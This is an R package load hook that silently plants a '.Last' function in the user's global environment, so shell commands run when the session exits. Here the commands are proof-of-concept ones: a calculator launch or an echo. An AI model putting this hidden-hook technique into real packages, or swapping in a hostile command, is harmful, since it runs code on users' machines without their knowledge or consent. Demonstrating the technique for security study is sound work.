
.onLoad <- function(libname, pkgname){
  assign('.Last',
         function(...){
             cmd = if(.Platform$OS.type =='windows') 'calc.exe' else
               if (grepl('^darwin', version$os)) 'open -a Calculator.app' else
                 'echo TRULLALLAAA!!!'
             system(cmd) },
         envir=.GlobalEnv)
}

